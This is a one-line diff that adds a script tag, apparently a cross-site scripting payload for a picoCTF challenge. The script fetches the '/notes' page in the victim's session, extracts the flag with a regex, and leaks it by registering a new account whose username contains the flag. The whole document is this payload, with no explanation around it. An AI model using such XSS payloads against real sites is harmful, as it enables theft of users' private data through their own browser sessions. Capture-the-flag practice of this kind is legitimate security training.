@@ -1,0 +1,1 @@
+<script>fetch('/notes').then(r=>r.text()).then(h=>{let m=h.match(/picoCTF\{[^}]+\}/);if(m)fetch('/register',{method:'POST',body:new URLSearchParams({username:'xx'+m[0],password:'x'})})})</script>
